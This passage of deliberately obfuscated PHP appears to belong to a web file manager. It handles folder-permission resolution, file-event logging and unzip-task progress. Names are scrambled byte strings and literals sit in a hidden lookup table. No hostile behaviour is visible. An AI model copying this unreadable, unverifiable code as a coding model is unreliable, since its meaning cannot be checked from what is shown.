array_merge(array($†ëÛ‰¯[$Á¿ÚÆğĞ[194]]), array_reverse($Ÿ˜ÂÉƒû)); $âŒÈ øÖ = $this->sourceAuthSelect($Ÿ˜ÂÉƒû); $†¦Êœ° = array(); $‰’ÇµÀ» = array(); foreach ($âŒÈ øÖ as $ÂíŞÙ·Ğ => $˜’›Ç—°) { $Üï£ê = $this->authFolderOwnerUser($˜’›Ç—°); $†¦Êœ°[$ÂíŞÙ·Ğ] = $Üï£ê; $‰’ÇµÀ» = array_merge($‰’ÇµÀ», $Üï£ê[$Á¿ÚÆğĞ[678]]); if ($Üï£ê[$Á¿ÚÆğĞ[2238]]) { break; } } if (count($‰’ÇµÀ») == 0) { $‰’ÇµÀ» = $this->authFolderOwnerGroup($†ëÛ‰¯[$Á¿ÚÆğĞ[582]]); } $‰’ÇµÀ» = array_unique($‰’ÇµÀ»); if (AuthModel::authCheckRoot($†ëÛ‰¯[$Á¿ÚÆğĞ[498]][$Á¿ÚÆğĞ[499]])) { $‰’ÇµÀ»[] = USER_ID; } $†ëÛ‰¯[$Á¿ÚÆğĞ[498]][$Á¿ÚÆğĞ[2239]] = Model($Á¿ÚÆğĞ[590])->userListInfo($‰’ÇµÀ»); return $†ëÛ‰¯; } private function authFolderOwnerGroup($­ôÃÊ©é) { $‡ï†œğè =& $_SERVER[Î·Ü›öğ]; $™¢¿Ğä = Model($‡ï†œğè[2104])->where(array($‡ï†œğè[1420] => $­ôÃÊ©é))->select(); $ö¿Òíæã = array(); if (!$™¢¿Ğä) { return $ö¿Òíæã; } foreach ($™¢¿Ğä as $”åÅ£ Ê) { $„†“…ß¦ = $this->authInfo($”åÅ£ Ê); if (AuthModel::authCheckRoot($„†“…ß¦[$‡ï†œğè[498]])) { $ö¿Òíæã[] = $”åÅ£ Ê[$‡ï†œğè[1810]]; } } return $ö¿Òíæã; } private function authFolderOwnerUser($ÍåÌ¨) { $ã“‡¸¨½ =& $_SERVER[Î·Ü›öğ]; $¤é”È×ø = array(); $ö©òµƒ˜ = !1; foreach ($ÍåÌ¨ as $˜Ç•ƒİ) { $çŞÁ¦† = $this->authInfo($˜Ç•ƒİ); if ($˜Ç•ƒİ[$ã“‡¸¨½[582]] == $ã“‡¸¨½[231]) { $ö©òµƒ˜ = !0; } if ($˜Ç•ƒİ[$ã“‡¸¨½[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($çŞÁ¦†[$ã“‡¸¨½[498]])) { $¤é”È×ø[] = $˜Ç•ƒİ[$ã“‡¸¨½[582]]; } } } return array($ã“‡¸¨½[678] => $¤é”È×ø, $ã“‡¸¨½[2238] => $ö©òµƒ˜); } public function authMake($ëÚ¦‰È½, $§áôúÄ = false) { $ÃûÛâ•Ú =& $_SERVER[Î·Ü›öğ]; $³‡¦àªŠ = $this->authArrayCheck($ëÚ¦‰È½, $§áôúÄ); if ($³‡¦àªŠ[$ÃûÛâ•Ú[2218]]) { $³‡¦àªŠ[$ÃûÛâ•Ú[2218]] = $this->sourceAuthInfo($³‡¦àªŠ[$ÃûÛâ•Ú[2218]]); } return $³‡¦àªŠ; } public function authArrayCheck($ï¡ÒşÍ¡, $ËÌÕàò = false) { $…¦÷Ş¹Á =& $_SERVER[Î·Ü›öğ]; if (!$ï¡ÒşÍ¡) { return array($…¦÷Ş¹Á[499] => 0, $…¦÷Ş¹Á[553] => !1, $…¦÷Ş¹Á[2233] => $…¦÷Ş¹Á[12]); } $ËÌÕàò = $ËÌÕàò ? $ËÌÕàò : USER_ID; $¥°’©Ïœ = 0; $Ü×¯«ÎÃ = 0; $´¥À¶âú = 0; $ƒâÖúÄÒ = 0; $†ŸñÕÒ¥ = 0; $Üş®»ûÖ = 0; $ù€î°¨å = 0; $¬ÉÂ¥™¿ = 0; $†Î›Œï = 1000; $ê„ö“ûø = 0; $çÖŞÉè = 0; $¬Ùóö–‹ = 0; $…ˆ¾çÚ… = 0; $­¡±Ç = 0; foreach ($ï¡ÒşÍ¡ as $÷Œ–é«é) { $àæĞ¾Ò = $this->authInfo($÷Œ–é«é); if (!$àæĞ¾Ò) { continue; } $ú‚‡ñ¤› = $÷Œ–é«é[$…¦÷Ş¹Á[582]]; $’¼ñıã = $÷Œ–é«é[$…¦÷Ş¹Á[194]]; $ÀåÂüÌ³ = intval($àæĞ¾Ò[$…¦÷Ş¹Á[498]]); if ($÷Œ–é«é[$…¦÷Ş¹Á[191]] == SourceModel::TYPE_USER && $ú‚‡ñ¤› == $ËÌÕàò) { $¥°’©Ïœ = !0; $´¥À¶âú = $àæĞ¾Ò; $Ü×¯«ÎÃ = $ÀåÂüÌ³; $ƒâÖúÄÒ = $’¼ñıã; } else { if ($÷Œ–é«é[$…¦÷Ş¹Á[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ú‚‡ñ¤›, $ËÌÕàò)) { $†ŸñÕÒ¥ = !0; $˜Ÿñİ³¦ = $this->groupStepToUserGroup($ú‚‡ñ¤›, $ËÌÕàò); if ($˜Ÿñİ³¦ < $†Î›Œï) { $†Î›Œï = $˜Ÿñİ³¦; $Üş®»ûÖ = $ÀåÂüÌ³; $ù€î°¨å = $àæĞ¾Ò; $ê„ö“ûø = $ú‚‡ñ¤›; $¬ÉÂ¥™¿ = $’¼ñıã; } if ($˜Ÿñİ³¦ == $†Î›Œï && $ÀåÂüÌ³ >= $Üş®»ûÖ) { $Üş®»ûÖ = $ÀåÂüÌ³; $ù€î°¨å = $àæĞ¾Ò; $ê„ö“ûø = $ú‚‡ñ¤›; $¬ÉÂ¥™¿ = $’¼ñıã; } } else { if (!$ú‚‡ñ¤› || $ú‚‡ñ¤› == $…¦÷Ş¹Á[231]) { $çÖŞÉè = !0; $…ˆ¾çÚ… = $àæĞ¾Ò; $¬Ùóö–‹ = $ÀåÂüÌ³; $­¡±Ç = $’¼ñıã; } } } } if ($¥°’©Ïœ) { $ù„²ƒÑÒ = $Ü×¯«ÎÃ; $àæĞ¾Ò = $´¥À¶âú; $Î™†Ç‚ = $ƒâÖúÄÒ; $“È¬ƒÁÃ = LNG($…¦÷Ş¹Á[2240]); } else { if ($†ŸñÕÒ¥) { $ù„²ƒÑÒ = $Üş®»ûÖ; $àæĞ¾Ò = $ù€î°¨å; $Î™†Ç‚ = $¬ÉÂ¥™¿; $Á¢÷¿ = Model($…¦÷Ş¹Á[598])->getInfo($ê„ö“ûø); $“È¬ƒÁÃ = $…¦÷Ş¹Á[176] . $Á¢÷¿[$…¦÷Ş¹Á[602]] . $…¦÷Ş¹Á[2241] . LNG($…¦÷Ş¹Á[2242]); } else { if ($çÖŞÉè) { $ù„²ƒÑÒ = $¬Ùóö–‹; $àæĞ¾Ò = $…ˆ¾çÚ…; $Î™†Ç‚ = $­¡±Ç; $“È¬ƒÁÃ = LNG($…¦÷Ş¹Á[2220]); } else { $ù„²ƒÑÒ = 0; $àæĞ¾Ò = !1; $“È¬ƒÁÃ = $…¦÷Ş¹Á[12]; $Î™†Ç‚ = $…¦÷Ş¹Á[12]; } } } $¦Ú»¶«© = array($…¦÷Ş¹Á[2232] => intval($ù„²ƒÑÒ), $…¦÷Ş¹Á[2222] => $àæĞ¾Ò, $…¦÷Ş¹Á[2233] => $“È¬ƒÁÃ, $…¦÷Ş¹Á[2228] => $Î™†Ç‚); return $¦Ú»¶«©; } private function groupContainUser($¤ñµŞ“, $Îî¶ê¾Í = false) { return in_array($¤ñµŞ“, $this->userGroupParents($Îî¶ê¾Í)); } private function groupStepToUserGroup($Á¡ø¯öÑ, $»½©„Ìê = false) { $ı¨í±ô³ =& $_SERVER[Î·Ü›öğ]; $˜˜Êª’¢ = $this->userGroupList($»½©„Ìê); $ñ¸€¾¾ = 1000; $¿Á”…»÷ = $GLOBALS[$ı¨í±ô³[6]][$ı¨í±ô³[92]][$ı¨í±ô³[2117]] == 1; $¤Å¹âéû = $¿Á”…»÷ ? 3 : 2; foreach ($˜˜Êª’¢ as $ó·ëÏ¿) { if ($ó·ëÏ¿[$ı¨í±ô³[1420]] == $Á¡ø¯öÑ) { return 0; } $¹¢–Ã®ä = explode($ı¨í±ô³[50], trim($ó·ëÏ¿[$ı¨í±ô³[597]], $ı¨í±ô³[50])); if ($¹¢–Ã®ä[0] == $ı¨í±ô³[231] && count($¹¢–Ã®ä) > $¤Å¹âéû) { $‰è³½™ò = array_reverse(array_slice($¹¢–Ã®ä, $¤Å¹âéû)); $‹©¼Ååê = array_search($Á¡ø¯öÑ, $‰è³½™ò); if ($‹©¼Ååê !== !1 && $‹©¼Ååê + 1 <= $ñ¸€¾¾) { $ñ¸€¾¾ = $‹©¼Ååê + 1; } } } return $ñ¸€¾¾; } private function userGroupList($øäÍÛ¯« = false, $Õ¹õÇ¾ = false) { $ŞÛ”’Ì =& $_SERVER[Î·Ü›öğ]; static $œ™²Ò¡ = array(); if (isset($œ™²Ò¡[$øäÍÛ¯«])) { return $œ™²Ò¡[$øäÍÛ¯«]; } if (!$Õ¹õÇ¾) { $Õ¹õÇ¾ = Model($ŞÛ”’Ì[610])->getInfo($øäÍÛ¯«); } $œ™²Ò¡[$øäÍÛ¯«] = array_to_keyvalue($Õ¹õÇ¾[$ŞÛ”’Ì[1419]], $ŞÛ”’Ì[1420]); return $œ™²Ò¡[$øäÍÛ¯«]; } public function userGroupParents($”öŠ ÃÇ) { $Å´üÑº =& $_SERVER[Î·Ü›öğ]; static $¹ß˜óœ = array(); $”öŠ ÃÇ = $”öŠ ÃÇ ? $”öŠ ÃÇ : USER_ID; if (isset($¹ß˜óœ[$”öŠ ÃÇ])) { return $¹ß˜óœ[$”öŠ ÃÇ]; } $ËĞ§ş‚§ = $this->userGroupList($”öŠ ÃÇ); $£°ıâ¢Ğ = array(); $Æ£µ¶Ù× = $GLOBALS[$Å´üÑº[6]][$Å´üÑº[92]][$Å´üÑº[2117]] == 1; $¤æóéÁè = $Æ£µ¶Ù× ? 3 : 2; foreach ($ËĞ§ş‚§ as $‚áİµ‰) { $ëŞ¯Òüœ = array($‚áİµ‰[$Å´üÑº[1420]]); $¿îí»·Ë = explode($Å´üÑº[50], trim($‚áİµ‰[$Å´üÑº[597]], $Å´üÑº[50])); if ($¿îí»·Ë[0] == $Å´üÑº[231] && count($¿îí»·Ë) > $¤æóéÁè) { $ãú¿Ñö‹ = array_slice($¿îí»·Ë, $¤æóéÁè); $ëŞ¯Òüœ = array_merge($ëŞ¯Òüœ, array_reverse($ãú¿Ñö‹)); } $£°ıâ¢Ğ = array_merge($£°ıâ¢Ğ, $ëŞ¯Òüœ); } $¹ß˜óœ[$”öŠ ÃÇ] = array_unique($£°ıâ¢Ğ); return $¹ß˜óœ[$”öŠ ÃÇ]; } public function authTargetInfoMake($°¤ì¥ö) { $è«†ıûå =& $_SERVER[Î·Ü›öğ]; $‚«©Ê = array(); $à˜üéËÍ = array(); foreach ($°¤ì¥ö as $ƒéºÈ¿½) { if ($ƒéºÈ¿½[$è«†ıûå[191]] == SourceModel::TYPE_USER) { $‚«©Ê[] = intval($ƒéºÈ¿½[$è«†ıûå[582]]); } else { if ($ƒéºÈ¿½[$è«†ıûå[191]] == SourceModel::TYPE_GROUP) { $à˜üéËÍ[] = intval($ƒéºÈ¿½[$è«†ıûå[582]]); } } } if ($‚«©Ê) { $‚«©Ê = Model($è«†ıûå[590])->userListInfo($‚«©Ê); } if ($à˜üéËÍ) { $ÁĞÃÕÒ¦ = array($è«†ıûå[2099] => array($è«†ıûå[503], $à˜üéËÍ)); $à˜üéËÍ = Model($è«†ıûå[598])->field($è«†ıûå[2243])->where($ÁĞÃÕÒ¦)->select(); $à˜üéËÍ = array_to_keyvalue($à˜üéËÍ, $è«†ıûå[1420]); } return array($è«†ıûå[2244] => $‚«©Ê, $è«†ıûå[2245] => $à˜üéËÍ); } public function authInfo($ØéıÏ§) { $û»ò™Ğù =& $_SERVER[Î·Ü›öğ]; if ($ØéıÏ§[$û»ò™Ğù[2118]]) { $½ìíŠÖ¥ = Model($û»ò™Ğù[584])->listData($ØéıÏ§[$û»ò™Ğù[2118]]); if (!$½ìíŠÖ¥) { return !1; $ŸÜÇäÃó = Model($û»ò™Ğù[584])->listData(); $‰”îØ¼Ò = array_filter_by_field($ŸÜÇäÃó, $û»ò™Ğù[498], $û»ò™Ğù[231]); return $‰”îØ¼Ò; } $õòŒíä = array_field_key($½ìíŠÖ¥, array($û»ò™Ğù[477], $û»ò™Ğù[32], $û»ò™Ğù[498], $û»ò™Ğù[2033], $û»ò™Ğù[2034])); $õòŒíä[$û»ò™Ğù[2246]] = $ØéıÏ§; return $õòŒíä; } else { return array($û»ò™Ğù[504] => 0, $û»ò™Ğù[2016] => $ØéıÏ§[$û»ò™Ğù[2181]], $û»ò™Ğù[505] => $û»ò™Ğù[12], $û»ò™Ğù[2033] => $û»ò™Ğù[2247]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\143\145\x5f\145\x76\x65\x6e\164"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\x54\x69\x6d\x65", "\164\151\x6d\145", "\x69\x6e\x73\x65\x72\x74", "\x66\165\x6e\x63\x74\151\x6f\x6e"), array("\144\x65\x73\143", '', "\151\x6e\x73\145\162\164\x2c\165\x70\x64\x61\164\x65\x2c\163\145\154\x65\143\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ŸÕóØã, $®¾ÅûØ†, $šü¦ˆÓè = '') { $Å–™Œğ =& $_SERVER[Î·Ü›öğ]; if (!$this->eventSave) { return; } $±ÜÙ”ƒ = Model($Å–™Œğ[1458])->sourceInfo($ŸÕóØã); if (!$±ÜÙ”ƒ) { return !1; } if ($this->isDisableEvent($±ÜÙ”ƒ, $®¾ÅûØ†)) { return; } if ($šü¦ˆÓè && is_string($šü¦ˆÓè)) { $šü¦ˆÓè = array($Å–™Œğ[2049] => $šü¦ˆÓè); } $„Æ¦ä„‰ = defined($Å–™Œğ[2248]) ? USER_ID : 0; $» Òœßù = array($Å–™Œğ[502] => $ŸÕóØã, $Å–™Œğ[2249] => $±ÜÙ”ƒ[$Å–™Œğ[193]], $Å–™Œğ[2250] => $±ÜÙ”ƒ[$Å–™Œğ[32]], $Å–™Œğ[595] => !empty($±ÜÙ”ƒ[$Å–™Œğ[595]]) ? $±ÜÙ”ƒ[$Å–™Œğ[595]] : $Å–™Œğ[12], $Å–™Œğ[1801] => $„Æ¦ä„‰, $Å–™Œğ[507] => $®¾ÅûØ†, $Å–™Œğ[1803] => $šü¦ˆÓè); $this->addSystemLog($®¾ÅûØ†, $» Òœßù); unset($» Òœßù[$Å–™Œğ[2250]], $» Òœßù[$Å–™Œğ[595]]); return $this->add($» Òœßù); } private function addSystemLog($½ã¬ËÁÎ, $„âÄÆ¦) { $¹½Š°à» =& $_SERVER[Î·Ü›öğ]; if ($½ã¬ËÁÎ == $¹½Š°à»[2251]) { $½ã¬ËÁÎ = $„âÄÆ¦[$¹½Š°à»[537]][$¹½Š°à»[2252]]; } else { if (in_array($½ã¬ËÁÎ, array($¹½Š°à»[1990], $¹½Š°à»[2253]))) { $½ã¬ËÁÎ = $„âÄÆ¦[$¹½Š°à»[537]][$¹½Š°à»[171]]; } } $ûŒî¡‡Ü = array_merge($„âÄÆ¦, array($¹½Š°à»[2254] => $„âÄÆ¦[$¹½Š°à»[194]], $¹½Š°à»[2255] => $„âÄÆ¦[$¹½Š°à»[2255]])); Hook::trigger($¹½Š°à»[2256], $¹½Š°à»[2257] . $½ã¬ËÁÎ, $„âÄÆ¦); Model($¹½Š°à»[1955])->addLog($¹½Š°à»[2257] . $½ã¬ËÁÎ, $ûŒî¡‡Ü); } private function isDisableEvent($ÕÔ¯‡ ‘, $§Ãùµ¯È) { $Ÿ—¶´Ã¢ =& $_SERVER[Î·Ü›öğ]; if ($ÕÔ¯‡ ‘[$Ÿ—¶´Ã¢[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($§Ãùµ¯È == $Ÿ—¶´Ã¢[1257]) { return !1; } return !0; } public function eventCreate($«’Š§¨, $¨õäšÅí) { $…²Œ„Ï =& $_SERVER[Î·Ü›öğ]; $Šı¬¬Š© = Model($…²Œ„Ï[1458])->sourceInfo($«’Š§¨); $Ê¤Îºô = array($…²Œ„Ï[2252] => $¨õäšÅí, $…²Œ„Ï[32] => $Šı¬¬Š©[$…²Œ„Ï[32]]); return $this->addEvent($«’Š§¨, $…²Œ„Ï[2251], $Ê¤Îºô); } public function eventFileEdit($«Ùğ“á) { $éËÛŞÃ½ =& $_SERVER[Î·Ü›öğ]; $ğçŞûùµ = array($éËÛŞÃ½[2258] => $_SERVER[$éËÛŞÃ½[2259]], $éËÛŞÃ½[2260] => strtolower(ACTION)); if (isset($GLOBALS[$éËÛŞÃ½[7]][$éËÛŞÃ½[2261]])) { $ğçŞûùµ[$éËÛŞÃ½[2261]] = $éËÛŞÃ½[91]; } return $this->addEvent($«Ùğ“á, $éËÛŞÃ½[1980], $ğçŞûùµ); } public function eventRecycle($ÚÒ¤¹¬°, $‚Ä¿¾ÆĞ) { return $this->addEvent($ÚÒ¤¹¬°, $_SERVER[Î·Ü›öğ][2253], $‚Ä¿¾ÆĞ); } private static $_removeLast = ''; public function eventRemove($£Ï‹ïÕ™) { $È•ëÉ®î =& $_SERVER[Î·Ü›öğ]; self::$_removeLast = $£Ï‹ïÕ™; $İÃÉÖ¸ç = Model($È•ëÉ®î[1458])->sourceInfo($£Ï‹ïÕ™); $‹¯¡ñ´ë = array_field_key($İÃÉÖ¸ç, array($È•ëÉ®î[194], $È•ëÉ®î[554], $È•ëÉ®î[516], $È•ëÉ®î[597])); $™ˆÔ—ÜÎ = array($È•ëÉ®î[171] => $İÃÉÖ¸ç[$È•ëÉ®î[32]], $È•ëÉ®î[2260] => ACTION, $È•ëÉ®î[2262] => $‹¯¡ñ´ë); return $this->addEvent($İÃÉÖ¸ç[$È•ëÉ®î[193]], $È•ëÉ®î[1257], $™ˆÔ—ÜÎ); } public function eventShare($õ¸ƒ°ÜÜ, $¬±„Œô) { return $this->addEvent($õ¸ƒ°ÜÜ, $_SERVER[Î·Ü›öğ][1990], $¬±„Œô); } public function eventMove($âØíÔÑ, $óÜ÷¬‚, $Ô™•â‚ë) { $‰š¿ªîş =& $_SERVER[Î·Ü›öğ]; if (self::$_removeLast == $âØíÔÑ) { return; } $÷ŞĞÓ‰ò = Model($‰š¿ªîş[1458]); $¬¬àÊÆ† = $÷ŞĞÓ‰ò->sourceInfo($âØíÔÑ); $Â›Õ‡Ğ½ = $÷ŞĞÓ‰ò->sourceInfo($óÜ÷¬‚); $Ó³”­İ = $÷ŞĞÓ‰ò->sourceInfo($Ô™•â‚ë); $„Ê”¡§Ï = array($‰š¿ªîş[1269] => $óÜ÷¬‚, $‰š¿ªîş[2263] => $Â›Õ‡Ğ½[$‰š¿ªîş[32]], $‰š¿ªîş[2218] => !empty($Â›Õ‡Ğ½[$‰š¿ªîş[595]]) ? $Â›Õ‡Ğ½[$‰š¿ªîş[595]] : $‰š¿ªîş[12], $‰š¿ªîş[1270] => $Ô™•â‚ë, $‰š¿ªîş[2264] => $Ó³”­İ[$‰š¿ªîş[32]], $‰š¿ªîş[2265] => !empty($Ó³”­İ[$‰š¿ªîş[595]]) ? $Ó³”­İ[$‰š¿ªîş[595]] : $‰š¿ªîş[12]); $this->addEvent($âØíÔÑ, $‰š¿ªîş[636], $„Ê”¡§Ï); $¬¬àÊÆ† = $÷ŞĞÓ‰ò->sourceInfo($âØíÔÑ); $„Ê”¡§Ï = array($‰š¿ªîş[194] => $¬¬àÊÆ†[$‰š¿ªîş[194]], $‰š¿ªîş[32] => $¬¬àÊÆ†[$‰š¿ªîş[32]]); $this->addEvent($óÜ÷¬‚, $‰š¿ªîş[2266], $„Ê”¡§Ï); } public function eventCopy($İûìè×) { $this->eventCreate($İûìè×, $_SERVER[Î·Ü›öğ][634]); } public function eventRename($²åö¤Ö, $€íØÔÎ‰, $şùß•¾Æ) { $òŠÂšÉ =& $_SERVER[Î·Ü›öğ]; $™Ä÷Š¦¹ = array($òŠÂšÉ[1269] => $€íØÔÎ‰, $òŠÂšÉ[1270] => $şùß•¾Æ); return $this->addEvent($²åö¤Ö, $òŠÂšÉ[1472], $™Ä÷Š¦¹); } public function eventAddComment($•ö«€´, $Îë¾öÉî) { return $this->addEvent($•ö«€´, $_SERVER[Î·Ü›öğ][2267], $Îë¾öÉî); } public function eventAddDesc($ùñ•ˆ•, $Ášì¤œÕ) { return $this->addEvent($ùñ•ˆ•, $_SERVER[Î·Ü›öğ][2268], $Ášì¤œÕ); } public function listBySource($òĞ¹“ÙÁ) { $«ş¥Õ¬ì =& $_SERVER[Î·Ü›öğ]; $Ûëƒèêó = Model($«ş¥Õ¬ì[1458])->sourceInfo($òĞ¹“ÙÁ); $øæ£Ÿ´ñ = array($«ş¥Õ¬ì[502] => $òĞ¹“ÙÁ); if ($Ûëƒèêó[$«ş¥Õ¬ì[496]] == $«ş¥Õ¬ì[91]) { $ó®Ğ¸ıÉ = Model($«ş¥Õ¬ì[1458])->listSearchChildren($òĞ¹“ÙÁ, 20000); $ó®Ğ¸ıÉ[] = $òĞ¹“ÙÁ . $«ş¥Õ¬ì[456]; $øæ£Ÿ´ñ = array($«ş¥Õ¬ì[194] => array($«ş¥Õ¬ì[7], $ó®Ğ¸ıÉ)); } $½ñæàÎë = $this->where($øæ£Ÿ´ñ)->order($«ş¥Õ¬ì[2269])->selectPage(); if ($½ñæàÎë[$«ş¥Õ¬ì[444]][$«ş¥Õ¬ì[445]] == 0) { $½ñæàÎë[$«ş¥Õ¬ì[444]][$«ş¥Õ¬ì[445]] = 1; $½ñæàÎë[$«ş¥Õ¬ì[447]] = array(array($«ş¥Õ¬ì[502] => $òĞ¹“ÙÁ, $«ş¥Õ¬ì[2249] => $Ûëƒèêó[$«ş¥Õ¬ì[193]], $«ş¥Õ¬ì[1801] => $Ûëƒèêó[$«ş¥Õ¬ì[538]], $«ş¥Õ¬ì[507] => $«ş¥Õ¬ì[2270], $«ş¥Õ¬ì[508] => $Ûëƒèêó[$«ş¥Õ¬ì[234]], $«ş¥Õ¬ì[1803] => $«ş¥Õ¬ì[12])); } return $this->eventListParse($½ñæàÎë, $òĞ¹“ÙÁ); } private function eventListParse($Î¶²Ø©¦, $ï¢ù¢ãú) { $Â‡Éş =& $_SERVER[Î·Ü›öğ]; $”Ïğ ãç = $Î¶²Ø©¦[$Â‡Éş[447]]; $Ø«Â€¼ = array_to_keyvalue($”Ïğ ãç, $Â‡Éş[12], $Â‡Éş[194]); $ØŸÁİÂŸ = array_to_keyvalue($”Ïğ ãç, $Â‡Éş[12], $Â‡Éş[2255]); foreach ($”Ïğ ãç as $È¼ú¨—ä) { $ıñôÂ©¥ = $È¼ú¨—ä[$Â‡Éş[537]]; if ($È¼ú¨—ä[$Â‡Éş[33]] == $Â‡Éş[636] && isset($ıñôÂ©¥[$Â‡Éş[1269]])) { $Ø«Â€¼[] = $ıñôÂ©¥[$Â‡Éş[1269]] . $Â‡Éş[12]; $Ø«Â€¼[] = $ıñôÂ©¥[$Â‡Éş[1270]] . $Â‡Éş[12]; } if ($È¼ú¨—ä[$Â‡Éş[33]] == $Â‡Éş[2266] && isset($ıñôÂ©¥[$Â‡Éş[194]])) { $Ø«Â€¼[] = $ıñôÂ©¥[$Â‡Éş[194]] . $Â‡Éş[12]; } } $Ø«Â€¼ = array_merge($Ø«Â€¼, $ØŸÁİÂŸ, array($ï¢ù¢ãú . $Â‡Éş[12])); $Ø«Â€¼ = array_unique($Ø«Â€¼); $ÏÔé£¦ = array_unique(array_to_keyvalue($”Ïğ ãç, $Â‡Éş[12], $Â‡Éş[1810])); $“æÙµƒ‹ = Model($Â‡Éş[610])->userListInfo($ÏÔé£¦); $Ìà‡ğÔŸ = Model($Â‡Éş[922])->sourceListInfo($Ø«Â€¼, !0); foreach ($”Ïğ ãç as &$È¼ú¨—ä) { if ($È¼ú¨—ä[$Â‡Éş[33]] == $Â‡Éş[636] && isset($È¼ú¨—ä[$Â‡Éş[537]][$Â‡Éş[1269]])) { $È¼ú¨—ä[$Â‡Éş[537]][$Â‡Éş[1269]] = $Ìà‡ğÔŸ[$È¼ú¨—ä[$Â‡Éş[537]][$Â‡Éş[1269]]]; $È¼ú¨—ä[$Â‡Éş[537]][$Â‡Éş[1270]] = $Ìà‡ğÔŸ[$È¼ú¨—ä[$Â‡Éş[537]][$Â‡Éş[1270]]]; } if ($È¼ú¨—ä[$Â‡Éş[33]] == $Â‡Éş[2266] && isset($È¼ú¨—ä[$Â‡Éş[537]][$Â‡Éş[194]])) { $È¼ú¨—ä[$Â‡Éş[537]][$Â‡Éş[194]] = $Ìà‡ğÔŸ[$È¼ú¨—ä[$Â‡Éş[537]][$Â‡Éş[194]]]; } $È¼ú¨—ä[$Â‡Éş[90]] = $Ìà‡ğÔŸ[$È¼ú¨—ä[$Â‡Éş[194]]]; $È¼ú¨—ä[$Â‡Éş[2271]] = $Ìà‡ğÔŸ[$È¼ú¨—ä[$Â‡Éş[2255]]]; if ($È¼ú¨—ä[$Â‡Éş[33]] == $Â‡Éş[1257]) { $È¼ú¨—ä[$Â‡Éş[2271]] = $È¼ú¨—ä[$Â‡Éş[90]]; $È¼ú¨—ä[$Â‡Éş[2255]] = $È¼ú¨—ä[$Â‡Éş[2271]][$Â‡Éş[194]]; $È¼ú¨—ä[$Â‡Éş[90]] = !1; $È¼ú¨—ä[$Â‡Éş[194]] = $Â‡Éş[12]; } $È¼ú¨—ä[$Â‡Éş[2192]] = $“æÙµƒ‹[$È¼ú¨—ä[$Â‡Éş[1810]]]; } unset($È¼ú¨—ä); $Î¶²Ø©¦[$Â‡Éş[447]] = $”Ïğ ãç; return $Î¶²Ø©¦; } public function removeBySource($–Ê»ª©Ÿ) { $ˆĞ³ò©ø = array($_SERVER[Î·Ü›öğ][502] => $–Ê»ª©Ÿ); $this->where($ˆĞ³ò©ø)->remove(); } } goto Dí„°“Ñ×è; c¾Ÿ¢Ì£¼ö: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ŸÈ¥ü ó =& $_SERVER[Î·Ü›öğ]; parent::startAfter(); Hook::bind($ŸÈ¥ü ó[1926], array($this, $ŸÈ¥ü ó[1927])); Hook::bind($ŸÈ¥ü ó[1308], array($this, $ŸÈ¥ü ó[1928])); Hook::bind($ŸÈ¥ü ó[1929], array($this, $ŸÈ¥ü ó[1930])); $Õ“Øâü“ =& $this->task; $Õ“Øâü“[$ŸÈ¥ü ó[1931]] = $ŸÈ¥ü ó[1309]; if (!$Õ“Øâü“[$ŸÈ¥ü ó[1696]]) { $Õ“Øâü“[$ŸÈ¥ü ó[1696]] = LNG($ŸÈ¥ü ó[1932]); } } protected function endAfter() { $÷´¬¡¢Æ =& $_SERVER[Î·Ü›öğ]; parent::endAfter(); Hook::unbind($÷´¬¡¢Æ[1926], array($this, $÷´¬¡¢Æ[1927])); Hook::unbind($÷´¬¡¢Æ[1308], array($this, $÷´¬¡¢Æ[1928])); Hook::unbind($÷´¬¡¢Æ[1929], array($this, $÷´¬¡¢Æ[1930])); } public function updateAfter() { $ºå÷ƒªõ =& $_SERVER[Î·Ü›öğ]; $§œôÌŞ¦ =& $this->task; if (!$§œôÌŞ¦[$ºå÷ƒªõ[1162]] || !$§œôÌŞ¦[$ºå÷ƒªõ[853]]) { if ($§œôÌŞ¦[$ºå÷ƒªõ[1931]] != $ºå÷ƒªõ[390]) { return; } } if ($§œôÌŞ¦[$ºå÷ƒªõ[1931]] == $ºå÷ƒªõ[1309]) { $Ç’È‰ = 0; if ($§œôÌŞ¦[$ºå÷ƒªõ[1864]]) { $Ç’È‰ = $§œôÌŞ¦[$ºå÷ƒªõ[1865]] / $§œôÌŞ¦[$ºå÷ƒªõ[1864]]; } $§œôÌŞ¦[$ºå÷ƒªõ[1812]] = $Ç’È‰ * 0.3; } else { if ($§œôÌŞ¦[$ºå÷ƒªõ[1931]] == $ºå÷ƒªõ[390]) { $Ç’È‰ = $§œôÌŞ¦[$ºå÷ƒªõ[1811]] / $§œôÌŞ¦[$ºå÷ƒªõ[1162]]; $§œôÌŞ¦[$ºå÷ƒªõ[1812]] = 0.3 + $Ç’È‰ * 0.4; } else { if ($§œôÌŞ¦[$ºå÷ƒªõ[1931]] == $ºå÷ƒªõ[110]) { $ÊÈ˜äéŞ = 0; if ($§œôÌŞ¦[$ºå÷ƒªõ[1866]] == $ºå÷ƒªõ[110]) { $ÊÈ˜äéŞ = $§œôÌŞ¦[$ºå÷ƒªõ[1865]]; } $Ç’È‰ = ($§œôÌŞ¦[$ºå÷ƒªõ[1869]] + $ÊÈ˜äéŞ) / $§œôÌŞ¦[$ºå÷ƒªõ[853]]; $§œôÌŞ¦[$ºå÷ƒªõ[1812]] = 0.3 + 0.4 + $Ç’È‰ * 0.3; } } } if ($§œôÌŞ¦[$ºå÷ƒªõ[1812]] > 0) { $ß¯ò¹–® = timeFloat() - $§œôÌŞ¦[$ºå÷ƒªõ[1814]] - $§œôÌŞ¦[$ºå÷ƒªõ[1817]]; $§œôÌŞ¦[$ºå÷ƒªõ[1818]] = $ß¯ò¹–® * (1 - $§œôÌŞ¦[$ºå÷ƒªõ[1812]]) / $§œôÌŞ¦[$ºå÷ƒªõ[1812]]; } } public function addFile($Œ‰’õà¨) { $ÕóßŒÂÉ =& $_SERVER[Î·Ü›öğ]; $Ó‘¼à  =& $this->task; $éÇç„§ = IO::info($Œ‰’õà¨); $Ó‘¼à [$ÕóßŒÂÉ[1862]] = $éÇç„§[$ÕóßŒÂÉ[32]]; $Ó‘¼à 